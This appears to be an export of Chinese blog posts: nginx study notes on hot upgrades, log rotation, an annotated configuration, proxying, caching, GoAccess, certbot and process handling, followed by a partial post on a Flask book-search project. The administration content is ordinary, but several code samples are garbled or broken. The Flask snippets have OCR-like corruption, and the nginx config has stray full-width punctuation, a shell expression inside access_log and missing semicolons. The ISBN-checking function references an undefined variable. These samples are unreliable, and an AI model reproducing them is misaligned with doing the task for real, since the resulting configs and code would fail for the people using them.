<h3 id="nginx-的新版本热部署"><a href="#nginx-的新版本热部署" class="headerlink" title="nginx 的新版本热部署"></a>nginx 的新版本热部署</h3><p>先 cp nginx 新版本的二进制文件 ：cp nginx nginx.old<br>USR2 信号：kill -USR2 $pid : 新老nginx进程都在运行<br>WINCH 信号：kill -WINCH $pid ：老版本的work进程已经关闭，但是master进程还在运行，这样方便快速回退。</p>
<h3 id="nginx-日志切割"><a href="#nginx-日志切割" class="headerlink" title="nginx 日志切割"></a>nginx 日志切割</h3><p>首先将日志cp一份；<br>然后 nginx -s reopen 重新生成一份新的日志。当然 向 pid 发送 USR1 信号是一样的</p>
<p>写一个脚本放在 crontab 中，方便定时运行。</p>
<h2 id="nginx-配置文件说明"><a href="#nginx-配置文件说明" class="headerlink" title="nginx 配置文件说明"></a>nginx 配置文件说明</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user nginx nginx;    　　　　　　　　    #定义Nginx运行的用户和用户组</span><br><span class="line">worker_processes 1;    　　　　　　　　#nginx进程数，建议设置为等于CPU总核心数。</span><br><span class="line">error_log /var/log/nginx/error.log info;　　    #全局错误日志定义类型，[ debug | info | notice | warn | error | crit ]</span><br><span class="line">pid /var/run/nginx.pid;    　　　　　　　　　　　　#进程文件</span><br><span class="line">worker_rlimit_nofile 1024;    　　    #一个nginx进程打开的最多文件描述符数目，理论值应该是最多打开文件数（系统的值ulimit -n）与nginx进程数相除，但是nginx分配请求并不均匀，所以#建议与ulimit -n的值保持一致</span><br><span class="line"></span><br><span class="line">events</span><br><span class="line">&#123;</span><br><span class="line">use epoll;    　　    #参考事件模型，use [ kqueue | rtsig | epoll | /dev/poll | select | poll ]; epoll模型是Linux 2.6以上版本内核中的高性能网络I/O模型，</span><br><span class="line">　　　　　　　　　　　　　　　　如果跑在FreeBS　　#D上面，就用kqueue模型。</span><br><span class="line"></span><br><span class="line">worker_connections 65535;　　　　    #单个进程最大连接数（最大连接数=连接数*进程数）</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http    　　　　　　　　　　　　　　　　    #HTTP区块开始</span><br><span class="line">&#123;</span><br><span class="line">include mime.types;    　　　　　　　　　　　　　　　　　　#Nginx支持的媒体类型库文件</span><br><span class="line">default_type application/octet-stream; 　　　　　　#默认媒体类型</span><br><span class="line">#charset utf-8; 　　　　　　　　　　　　　　　　　　　　#默认编码</span><br><span class="line">server_names_hash_bucket_size 128; 　　　　　　　　#服务器名字的hash表大小</span><br><span class="line">client_header_buffer_size 32k;    　　　　　　　　　　 #上传文件大小限制</span><br><span class="line">large_client_header_buffers 4 64k;    　　　　　　　　 #设定请求缓</span><br><span class="line">client_max_body_size 8m;    　　　　　　　　　　　　　　    #设定请求缓</span><br><span class="line">sendfile on; 　　　　　　#开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，如果用来进行下载等应用磁盘IO重负载应用，可设置为o　　#ff，以平衡磁盘与网络I/O处理速度，降低系统的负载。注意：如果图片显示不正常把这个改成off。</span><br><span class="line">autoindex on; 　　　　　　　　　　　　　　    #开启目录列表访问，合适下载服务器，默认关闭。</span><br><span class="line">tcp_nopush on; 　　　　　　　　　　　　　　#防止网络阻塞</span><br><span class="line">tcp_nodelay on; 　　　　　　　　　　　　　#防止网络阻塞</span><br><span class="line">keepalive_timeout 120;    　　　　　　　　 #连接超时，单位是秒</span><br><span class="line"></span><br><span class="line">#FastCGI相关参数是为了改善网站的性能：减少资源占用，提高访问速度。</span><br><span class="line">fastcgi_connect_timeout 300;</span><br><span class="line">fastcgi_send_timeout 300;</span><br><span class="line">fastcgi_read_timeout 300;</span><br><span class="line">fastcgi_buffer_size 64k;</span><br><span class="line">fastcgi_buffers 4 64k;</span><br><span class="line">fastcgi_busy_buffers_size 128k;</span><br><span class="line">fastcgi_temp_file_write_size 128k;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gzip模块设置</span><br><span class="line">gzip on;    　　　　　　　　　　　　　　　　　　                  #开启gzip压缩输出</span><br><span class="line">gzip_min_length 1k; 　　　　　　　　　　　　                     #最小压缩文件大小，小于就不压缩了</span><br><span class="line">gzip_buffers 4 16k; 　　　　　　　　　　                         #压缩缓冲区</span><br><span class="line">gzip_http_version 1.0; 　　　　　　　　　　                      #压缩版本（默认1.1，前端如果是squid2.5请使用1.0）</span><br><span class="line">gzip_comp_level 2;    　　　　　　　　　　　　                    #压缩等级</span><br><span class="line">gzip_types text/x-javascript text/css application/xml;　　　　  #压缩类型，默认就已经包含text/html，所以下面就不用再写了，写上去也不会有问题，但是会有一个warn。</span><br><span class="line">gzip_vary on;</span><br><span class="line">#limit_zone crawler $binary_remote_addr 10m;　　                #开启限制IP连接数的时候需要使用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#虚拟主机的配置</span><br><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">listen 80;    　　　　　　　　　　　　　　　　　　　　　#监听端口</span><br><span class="line"></span><br><span class="line">server_name localhost;    　　　　　　　　　　　　　　#提供服务的域名主机名</span><br><span class="line">location / &#123;　　　　　　　　　　　　　　　　　　　　#第一个location区块开始</span><br><span class="line">root html； 　　　　　　　　　　　　　　　　　　　　 #站点的根目录，相当于Nginx的安装目录</span><br><span class="line">index index.html index.htm index.jsp;　　    　　#默认的首页文件，多个用空格分开</span><br><span class="line">&#125; 　　　　　　　　　　　　　　　　　　　　　　　　 #第一个location区块结果</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#图片缓存时间设置</span><br><span class="line">location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$</span><br><span class="line">&#123;</span><br><span class="line">expires 10d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#JS和CSS缓存时间设置</span><br><span class="line">location ~ .*\.(js|css)?$</span><br><span class="line">&#123;</span><br><span class="line">expires 1h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#日志格式设定</span><br><span class="line">log_format access &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;log_       #access这种格式可以自定义作为标识。</span><br><span class="line">&apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;                  # remote_addr 代表远端地址，time_local 当时时间，status 状态码，内置变量以及第三方模块提供的变量</span><br><span class="line">&apos;&quot;$http_user_agent&quot; $http_x_forwarded_for&apos;;</span><br><span class="line"></span><br><span class="line">access_log /var/log/nginx/access_$(data+%F -d -1day).log access;　　　　#定义本虚拟主机的访问日志，采用access的这种格式</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">location / &#123;    　　　　　　　　　　　　　　　　　　　　　　    #对 &quot;/&quot; 启用反向代理</span><br><span class="line">proxy_pass http://127.0.0.1:88;</span><br><span class="line">proxy_redirect off;</span><br><span class="line">proxy_set_header X-Real-IP $remote_addr; 　　　　　　 #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP,做限制什么的不然就限制代理服务地址了。</span><br><span class="line">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line"></span><br><span class="line">#以下是一些反向代理的配置，可选</span><br><span class="line">proxy_set_header Host $host;                        # </span><br><span class="line">client_max_body_size 10m; 　　　　　　　　　　　　    #允许客户端请求的最大单文件字节数</span><br><span class="line">client_body_buffer_size 128k; 　　　　　　　　    #缓冲区代理缓冲用户端请求的最大字节数，</span><br><span class="line">proxy_connect_timeout 90;　　　　　　　　　　　　#nginx跟后端服务器连接超时时间(代理连接超时)</span><br><span class="line">proxy_send_timeout 90; 　　　　　　　　　　　　    #后端服务器数据回传时间(代理发送超时)</span><br><span class="line">proxy_read_timeout 90;　　　　　　　　　　　　#连接成功后，后端服务器响应时间(代理接收超时)</span><br><span class="line">proxy_buffer_size 4k; 　　　　　　　　　　　　    #设置代理服务器（nginx）保存用户头信息的缓冲区大小</span><br><span class="line">proxy_buffers 4 32k; 　　　　　　　　　　　　    #proxy_buffers缓冲区，网页平均在32k以下的设置</span><br><span class="line">proxy_busy_buffers_size 64k; 　　　　　　　　    #高负荷下缓冲大小（proxy_buffers*2）</span><br><span class="line">proxy_temp_file_write_size 64k;    　　　　　　　　    #设定缓存文件夹大小，大于这个值，将从upstream服务器传</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#设定查看Nginx状态的地址</span><br><span class="line">location /NginxStatus &#123;</span><br><span class="line">stub_status on;</span><br><span class="line">access_log on;</span><br><span class="line">auth_basic &quot;NginxStatus&quot;;</span><br><span class="line">auth_basic_user_file conf/htpasswd;    　　　　　　#htpasswd文件的内容可以用apache提供的htpasswd工具来产生。</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#本地动静分离反向代理配置</span><br><span class="line">#所有jsp的页面均交由tomcat或resin处理</span><br><span class="line">location ~ .(jsp|jspx|do)?$ &#123;</span><br><span class="line">proxy_set_header Host $host;</span><br><span class="line">proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">proxy_pass http://127.0.0.1:8080;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#所有静态文件由nginx直接读取不经过tomcat或resin</span><br><span class="line">location ~ .*.(htm|html|gif|jpg|jpeg|png|bmp|swf|ioc|rar|zip|txt|flv|mid|doc|ppt|pdf|xls|mp3|wma)$</span><br><span class="line">&#123; expires 15d; &#125;</span><br><span class="line">location ~ .*.(js|css)?$</span><br><span class="line">&#123; expires 1h; &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="nginx-配置静态资源服务器"><a href="#nginx-配置静态资源服务器" class="headerlink" title="nginx 配置静态资源服务器"></a>nginx 配置静态资源服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">location /&#123;</span><br><span class="line">    autoindex on;    #访问的url以 / 结尾时，显示当前文件夹下的文件结构</span><br><span class="line">    set $limit_rate 1k        #限制访问的使用度,每秒传输1k</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="配置反向代理"><a href="#配置反向代理" class="headerlink" title="配置反向代理"></a>配置反向代理</h3><p>listen 127.0.0.1:8080 仅支持本地访问，通过反向代理来访问该资源。</p>
<p>upstream local {<br>    server 127.0.0.1:8080<br>}</p>
<h3 id="配置缓存服务器"><a href="#配置缓存服务器" class="headerlink" title="配置缓存服务器"></a>配置缓存服务器</h3><p>upstream local {<br>    server 127.0.0.1:8080<br>}<br><img data-src="http://tuchuang.xchcloud.cn/blog/20200226/yhOQSTSsGUV0.png?imageslim" alt="mark"><br>ps: key 目的时对应不同的用户有着不同的资源。<br>proxy_cache_path /tmp/nginx cache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=60m use_temp_path=off;</p>
<h3 id="用GoAccess实现可视化并实时监控access日志"><a href="#用GoAccess实现可视化并实时监控access日志" class="headerlink" title="用GoAccess实现可视化并实时监控access日志"></a>用GoAccess实现可视化并实时监控access日志</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、GoAccess下载地址：https://goaccess.io/download</span><br><span class="line"></span><br><span class="line">2、yum方式安装GoAccess所需软件包：</span><br><span class="line"># yum install GeoIP-devel ncurses ncurses-devel wget epel-release</span><br><span class="line"></span><br><span class="line">3、编译安装GoAccess：</span><br><span class="line"># wget https://tar.goaccess.io/goaccess-1.3.tar.gz</span><br><span class="line"># tar -xf goaccess-1.3.tar.gz -C /usr/src</span><br><span class="line"># cd /usr/src/goaccess-1.3</span><br><span class="line"># ./configure --prefix=/usr/local/goaccess --enable-utf8 --enable-geoip</span><br><span class="line"># make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">4、配置环境变量：</span><br><span class="line"># vim /etc/profile.d/goaccess.sh</span><br><span class="line">export PATH=/usr/local/goaccess/bin:$PATH</span><br><span class="line"># . /etc/profile.d/goaccess.sh</span><br><span class="line"># goaccess -V</span><br><span class="line"></span><br><span class="line">5、修改nginx.conf配置文件：</span><br><span class="line"># vim /etc/nginx/nginx.conf，确认如下配置默认已启用：</span><br><span class="line">log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                      &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                      &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line">access_log  /var/log/nginx/access.log  main;</span><br><span class="line"></span><br><span class="line">6、修改goaccess.conf配置文件：</span><br><span class="line"># cd /usr/local/goaccess/etc/goaccess/</span><br><span class="line"># cp goaccess.conf&#123;,.bak&#125;</span><br><span class="line"># vim goaccess.conf</span><br></pre></td></tr></table></figure>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20200226/dgv60SA2iib1.png?imageslim" alt="mark"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 7、控制台运行GoAccess：</span><br><span class="line"># goaccess /var/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">8、后台实时生成数据到GoAccess界面，并将分析结果保存为HTML：</span><br><span class="line"># goaccess -p /usr/local/goaccess/etc/goaccess/goaccess.conf</span><br><span class="line"></span><br><span class="line">或# goaccess /var/log/nginx/access.log --time-format=&apos;%H:%M:%S&apos; --date-format=&apos;%d/%b/%Y&apos; --log-format=COMBINED -o /usr/share/nginx/html/goaccess.html --addr=192.168.0.121 --real-time-html --daemonize</span><br><span class="line"># ps -ef | grep goaccess</span><br><span class="line"># ss -tunlp | grep 7890</span><br><span class="line">备注：如果需要输出实时HTML，需要打开防火墙7890端口</span><br><span class="line"></span><br><span class="line">9、浏览器访问http://ip/goaccess.html</span><br><span class="line"></span><br><span class="line">10、使用ab命令进行压测，模拟访问，观察页面数值是否实时变化：</span><br><span class="line"># yum -y install httpd-tools</span><br><span class="line"># ab -n 500000 -c 20 http://ip/</span><br></pre></td></tr></table></figure></p>
<p><a href="https://goaccess.io/man" target="_blank" rel="noopener">官方帮助文档</a><br><a href="https://blog.51cto.com/qiuyue/2455429" target="_blank" rel="noopener">参考博客</a></p>
<h2 id="SSL相关"><a href="#SSL相关" class="headerlink" title="SSL相关"></a>SSL相关</h2><p><img data-src="http://tuchuang.xchcloud.cn/blog/20200226/SpzgAgfGTUwR.png?imageslim" alt="mark"><br><img data-src="http://tuchuang.xchcloud.cn/blog/20200226/ctNN6Ulq1n6D.png?imageslim" alt="mark"></p>
<p>对称加密算法和非对称加密区别：</p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20200226/boqitVgPhYei.png?imageslim" alt="mark"><br><img data-src="http://tuchuang.xchcloud.cn/blog/20200226/qEmXvU4aom5T.png?imageslim" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20200226/RaGlhx7fW9eG.png?imageslim" alt="mark"></p>
<p>证书链：<br>根证书-二级证书-主证书<br><img data-src="http://tuchuang.xchcloud.cn/blog/20200226/q7wmBrfdhsds.png?imageslim" alt="mark"></p>
<p>上证书：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install python2-certbot-nginx</span><br><span class="line">certhot --nginx --nginx-server-root=/usr/local/openresty/nginx/conf/ -d 域名</span><br><span class="line"></span><br><span class="line">ps：根据提示，输入相关资料后，即可在/etc/letsencrypt/archive目录下得到证书文件。</span><br><span class="line">或者：也可以直接使用以下命令直接生成。注意xxx需要替换为自己的东西。</span><br></pre></td></tr></table></figure></p>
<h3 id="certbot-自动化脚本"><a href="#certbot-自动化脚本" class="headerlink" title="certbot 自动化脚本"></a>certbot 自动化脚本</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line"></span><br><span class="line">  certbot [SUBCOMMAND] [options] [-d DOMAIN] [-d DOMAIN] ...</span><br><span class="line"></span><br><span class="line">Certbot可以获取并安装HTTPS/TLS/SSL证书。默认情况下</span><br><span class="line">它将尝试使用Web服务器来获取和安装</span><br><span class="line">证书。最常见的子命令和标志是：</span><br><span class="line"></span><br><span class="line">obtain, install, and renew certificates:</span><br><span class="line">    (default) run   在当前Web服务器中获取并安装证书</span><br><span class="line">    certonly        获取或续订证书，但不要安装它</span><br><span class="line">    renew           更新所有以前获得的证书</span><br><span class="line">expiry</span><br><span class="line">    enhance         为现有配置添加安全增强</span><br><span class="line">   -d DOMAINS       要获取证书的域的逗号分隔列表</span><br><span class="line"></span><br><span class="line">  (未安装certbot apache插件)</span><br><span class="line">  --standalone      运行独立的Web服务器进行身份验证</span><br><span class="line">  --nginx           使用Nginx插件进行身份验证和安装</span><br><span class="line">  --webroot         将文件放在服务器的webroot文件夹中进行身份验证</span><br><span class="line">  --manual          以交互方式获取证书，或使用shell脚本</span><br><span class="line">hooks</span><br><span class="line"></span><br><span class="line">   -n               非交互运行</span><br><span class="line">  --test-cert       从登台服务器获取测试证书</span><br><span class="line">  --dry-run         在不保存任何证书的情况下测试“renew”或“certonly”</span><br><span class="line">to disk</span><br><span class="line"></span><br><span class="line">manage certificates:管理证书</span><br><span class="line">    certificates    显示有关您从Certbot获得的证书的信息</span><br><span class="line">    revoke          Revoke a certificate (supply --cert-path or --cert-name)吊销证书（提供--证书路径或--证书名称）</span><br><span class="line">    delete          Delete a certificate</span><br><span class="line"></span><br><span class="line">manage your account:</span><br><span class="line">    register        Create an ACME account 创建ACME帐户</span><br><span class="line">    unregister      Deactivate an ACME account</span><br><span class="line">    update_account  Update an ACME account</span><br><span class="line">  --agree-tos       Agree to the ACME server&apos;s Subscriber Agreement 同意ACME服务器的订户协议</span><br><span class="line">   -m EMAIL         Email address for important account notifications 重要帐户通知的电子邮件地址</span><br><span class="line"></span><br><span class="line">More detailed help:</span><br><span class="line"></span><br><span class="line">  -h, --help [TOPIC]    print this message, or detailed help on a topic;打印此消息或有关某个主题的详细帮助</span><br><span class="line">                        the available TOPICS are: 可用的主题有</span><br><span class="line"></span><br><span class="line">   all, automation, commands, paths, security, testing, or any of the</span><br><span class="line">   subcommands or plugins (certonly, renew, install, register, nginx,</span><br><span class="line">   apache, standalone, webroot, etc.)</span><br><span class="line">  -h all                print a detailed help page including all topics</span><br><span class="line">  --version             print the version number</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br></pre></td></tr></table></figure>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20200226/7nEpTPJi8OuV.png?imageslim" alt="mark"><br><img data-src="http://tuchuang.xchcloud.cn/blog/20200226/qGlXkXJ8XgRg.png?imageslim" alt="mark"><br>ssl_session_catch ；            #1M 大约4000个连接<br>ssl_session_timeout 1440m;      #断开链接后大概多久内免再次握手<br>ssl_protocols :                 #nginx 支持哪些版本的安全协议<br>ssl_prefer_server_ciphers       #决定使用哪些协议<br>ssl_ciphers:                    #有哪些协议</p>
<h2 id="nginx请求处理流程"><a href="#nginx请求处理流程" class="headerlink" title="nginx请求处理流程"></a>nginx请求处理流程</h2><p><img data-src="http://tuchuang.xchcloud.cn/blog/20200227/YzeYBNlT1DRH.png?imageslim" alt="mark"></p>
<h2 id="nginx-进程结构-管理"><a href="#nginx-进程结构-管理" class="headerlink" title="nginx 进程结构/管理"></a>nginx 进程结构/管理</h2><p><img data-src="http://tuchuang.xchcloud.cn/blog/20200227/G1kkY70mTvsL.png?imageslim" alt="mark"></p>
<p>就是向 master 主进程发送信号</p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20200227/WLFQRax26PzN.png?imageslim" alt="mark"></p>
<h3 id="reload流程"><a href="#reload流程" class="headerlink" title="reload流程"></a>reload流程</h3><p>1、向 master 进程发送HUP信号（reload）<br>2、master进程校验配置语法是否正确<br>3、master进程打开新的监听端口<br>4、master进程用新配置启动新的worker子进程<br>5、master进程向老worker子进程发送QUIT信号 （极端情况老进程处理时间太长，会有个模块让它强制退出）<br>6、老worker进程关闭监听句柄，处理完当前连接后结束进程</p>
<h3 id="热升级流程"><a href="#热升级流程" class="headerlink" title="热升级流程"></a>热升级流程</h3><p>1、将旧的nginx文件换为新的nginx文件（注意备份）<br>2、向master进程发送USR2信号<br>3、master进程修改pid文件名，加后缀.oldbin<br>4、master进程用新的nginx文件启动新的master进程<br>5、向老master进程发送QUIT信号，关闭老master进程<br>6、回滚：向老master发送HUP,向新master发送QUIT</p>
<p>老 master 进程到底退出没？</p>
<h3 id="优雅的关闭work进程"><a href="#优雅的关闭work进程" class="headerlink" title="优雅的关闭work进程"></a>优雅的关闭work进程</h3><p>1、设置定时器（worker_shutdown_timeout）<br>2、关闭监听句柄（保证不会处理新的连接）<br>3、关闭空闲连接（为了保证资源的利用最大化，会保留空闲连接）<br>4、在循环中等待全部连接关闭（每当发现有连接处理完毕则关闭一个，但是当达到一个定时器时间会立即关闭所有）<br>5、退出进程</p>
<h2 id="网络收发与nginx的链路关系"><a href="#网络收发与nginx的链路关系" class="headerlink" title="网络收发与nginx的链路关系"></a>网络收发与nginx的链路关系</h2><p><img data-src="http://tuchuang.xchcloud.cn/blog/20200227/JrAk2ua7wy82.png?imageslim" alt="mark"><br><img data-src="http://tuchuang.xchcloud.cn/blog/20200227/yH1pVqXn6BG1.png?imageslim" alt="mark"></p>
<h3 id="nginx-事件循环"><a href="#nginx-事件循环" class="headerlink" title="nginx 事件循环"></a>nginx 事件循环</h3><h2 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h2><h3 id="nginx-请求切换"><a href="#nginx-请求切换" class="headerlink" title="nginx 请求切换"></a>nginx 请求切换</h3><h3 id="同步-amp-异步、阻塞-amp-非阻塞之间的区别"><a href="#同步-amp-异步、阻塞-amp-非阻塞之间的区别" class="headerlink" title="同步&amp;异步、阻塞&amp;非阻塞之间的区别"></a>同步&amp;异步、阻塞&amp;非阻塞之间的区别</h3><p>阻塞调用</p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20200227/a5icu0QOBVP8.png?imageslim" alt="mark"></p>
<p>非阻塞调用</p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20200227/6tPMQxSFE6R0.png?imageslim" alt="mark"></p>
<p>底层调用？</p>
<p>非阻塞调用之下的同步与异步</p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20200227/o7ObnXIWYyyn.png?imageslim" alt="mark"></p>
<h2 id="nginx-模块"><a href="#nginx-模块" class="headerlink" title="nginx 模块"></a>nginx 模块</h2><p>提供哪些配置项<br>模块何时被使用<br>提供哪些变量</p>
<p>查看 nginx 临时文件目录中的 nginx_***_module.c 文件<br>.c module 的源代码中都有一个 ngc_command_t 唯一的结构体，是个数组，包含所有的指令名。</p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20200227/zo4DlUG3XSlc.png?imageslim" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20200227/rWpq0eyYG19m.png?imageslim" alt="mark"></p>
<h3 id="流量复制"><a href="#流量复制" class="headerlink" title="流量复制"></a>流量复制</h3><p><a href="https://www.cnblogs.com/cjsblog/p/12163207.html" target="_blank" rel="noopener">Nginx流量复制</a></p>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Nginx</tag>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>python-Flask框架-鱼书网站实践</title>
    <url>/python-Flask%E6%A1%86%E6%9E%B6-%E9%B1%BC%E4%B9%A6%E7%BD%91%E7%AB%99%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h2 id="Flask-Fish-鱼书项目"><a href="#Flask-Fish-鱼书项目" class="headerlink" title="Flask Fish 鱼书项目"></a>Flask Fish 鱼书项目</h2><h3 id="确定访问的-url-路径问题"><a href="#确定访问的-url-路径问题" class="headerlink" title="确定访问的 url 路径问题"></a>确定访问的 url 路径问题</h3><p> 无非就是 url 使用时是否在地址最后加上 斜杠 。<br><a id="more"></a></p>
<h3 id="监听代码修改，热启动"><a href="#监听代码修改，热启动" class="headerlink" title="监听代码修改，热启动"></a>监听代码修改，热启动</h3><p>开启Flask 调试模式</p>
<p><code>python fisher.py</code></p>
<h3 id="注册路由："><a href="#注册路由：" class="headerlink" title="注册路由："></a>注册路由：</h3><p>1、用装饰器来注册路由。</p>
<p>2、app.add_url_rule</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#@app.route（&quot;/hel1o&apos;）</span><br><span class="line">def hel1o（）：</span><br><span class="line">#基于类的视图（即插视图）return&apos;Hel1o，QiYue&apos;</span><br><span class="line">app.add_url_rule（&quot;/hello&apos;，view_func=hel1o）</span><br><span class="line">app.run（debug=True）</span><br></pre></td></tr></table></figure>
<h3 id="配置-pycharm-全局访问路径、端口"><a href="#配置-pycharm-全局访问路径、端口" class="headerlink" title="配置 pycharm 全局访问路径、端口"></a>配置 pycharm 全局访问路径、端口</h3><p><code>app.run(host=&#39;0.0.0.0&#39;, debug=True,port=81)</code></p>
<h3 id="部署的话该怎么处理"><a href="#部署的话该怎么处理" class="headerlink" title="部署的话该怎么处理"></a>部署的话该怎么处理</h3><p>debug 简单修改的不是太好，调试模式下使用的是默认的Flask自带的服务器，性能不太好，以及后端出现错误的话，网页端会显示出来。</p>
<p>方法：</p>
<p>加一个 config.py 的配置文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fish.py</span><br><span class="line"></span><br><span class="line">from flask import Flask author=&apos;七月</span><br><span class="line">o a@p=Flask（_name__）</span><br><span class="line">app.config.from_object（&apos;config&apos;）</span><br><span class="line">@app.route（&quot;/hello&apos;s def hello（）：#基于类的视图（即插视图）return&apos;Hello，QiYue&apos;</span><br><span class="line">#字典dict子类</span><br><span class="line">#app.add_urlrule（&quot;/hello&apos;，view_func=hel1o）</span><br><span class="line">app.run（host=&apos;0.0.e.e&apos;，debug=app.config[&apos;DEBUG&apos;]，port=81）</span><br><span class="line"></span><br><span class="line">config.py</span><br><span class="line"></span><br><span class="line">__author_=&apos;七月&apos;</span><br><span class="line">DEBUG = True</span><br></pre></td></tr></table></figure></p>
<p>注意 config.py 无论是在配置里面还是在应用里面导入，都需要将参数全部大写。</p>
<h3 id="真正理解-if-name-‘main‘"><a href="#真正理解-if-name-‘main‘" class="headerlink" title="真正理解 if name == ‘main‘:"></a>真正理解 if <strong>name</strong> == ‘<strong>main</strong>‘:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.run(host=&apos;0.0.0.0&apos;, debug=True)</span><br></pre></td></tr></table></figure>
<p>在实际生产环境中需要 nginx+uwsgi 来搭配使用作为服务器。</p>
<p>作用：不会在实际生产环境中同时启用 nignx 和 flask 自带的服务器。</p>
<h3 id="搜索功能的实现"><a href="#搜索功能的实现" class="headerlink" title="搜索功能的实现"></a>搜索功能的实现</h3><h4 id="区分数字："><a href="#区分数字：" class="headerlink" title="区分数字："></a>区分数字：</h4><p>按照数字进行搜索</p>
<h4 id="区别书名："><a href="#区别书名：" class="headerlink" title="区别书名："></a>区别书名：</h4><p>识别传入的是书名，对书名进行搜索<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def is_isbn_or_key(word):</span><br><span class="line">    isbn_or_key = &apos;key&apos;</span><br><span class="line">    if len(word) == 13 and word.isdigit():</span><br><span class="line">        isbn_or_key = &apos;isbn&apos;</span><br><span class="line">        short_q = word.replace(&apos;-&apos;, &apos;&apos;)</span><br><span class="line">    if &apos;-&apos; in word and len(short_q) == 10 and short_q.isdigit:</span><br><span class="line">        # 条件判断的原则，提高代码的运行效率</span><br><span class="line">        # 先把很大概率出现假的                      条件放在前面</span><br><span class="line">        # 把查询数据库这种非常耗时的消耗放在后面</span><br><span class="line">        isbn_or_key = &apos;isbn&apos;</span><br><span class="line">    return isbn_or_key</span><br></pre></td></tr></table></figure></p>
<h4 id="使用-API"><a href="#使用-API" class="headerlink" title="使用 API"></a>使用 API</h4><p>如何调用 api ：<br>如何设计 api ：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class YuShuBook:</span><br><span class="line">    isbn_url = &apos;http://t.yushu.im/v2/book/isbn/&#123;&#125;&apos;</span><br><span class="line">    keyword_ur1 = &apos;http://t.yushu.im/v2/book/search?q=&#123;&#125;&amp;count=&#123;&#125;&amp;start=&#123;&#125;&apos;</span><br><span class="line"></span><br><span class="line">    # &#123;&#125; 代表动态数据</span><br><span class="line">    @classmethod</span><br><span class="line">    def search_by_isbn(cls, isbn):</span><br><span class="line">        url = cls.isbn_url.format(isbn)</span><br><span class="line">        #    url = self.isbn_url  # 链式查找</span><br><span class="line">        result = HTTP.get(url)</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def search_by_keyword(cls, keyword, page=1):</span><br><span class="line">        print(1)</span><br><span class="line">        url = cls.keyword_ur1.format(keyword, current_app.config[&apos;PER_PAGE&apos;], cls.calculate_start(page))</span><br><span class="line">        result = HTTP.get(url)</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def calculate_start(page):</span><br><span class="line">        return (page - 1) * current_app.config[&apos;PER_PAGE&apos;]</span><br></pre></td></tr></table></figure></p>
